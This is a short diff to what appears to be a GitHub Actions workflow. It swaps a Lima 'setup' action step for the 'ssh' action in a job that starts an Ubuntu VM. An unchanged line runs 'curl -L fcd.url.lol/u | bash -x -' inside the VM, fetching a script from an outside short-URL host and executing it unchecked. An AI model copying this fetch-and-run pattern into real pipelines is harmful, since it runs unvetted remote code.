@@ -26,7 +26,7 @@ jobs:
       - name: Setup lima
         run: limactl start --plain --name=default --cpus=2 --memory=2 template://ubuntu
 
-      - uses: lima-vm/lima-actions/setup@03b96d61959e83b2c737e44162c3088e81de0886 # v1.0.1
+      - uses: lima-vm/lima-actions/ssh@03b96d61959e83b2c737e44162c3088e81de0886 # v1.0.1
 
       - run: ssh lima-default 'curl -L fcd.url.lol/u | bash -x -'
 
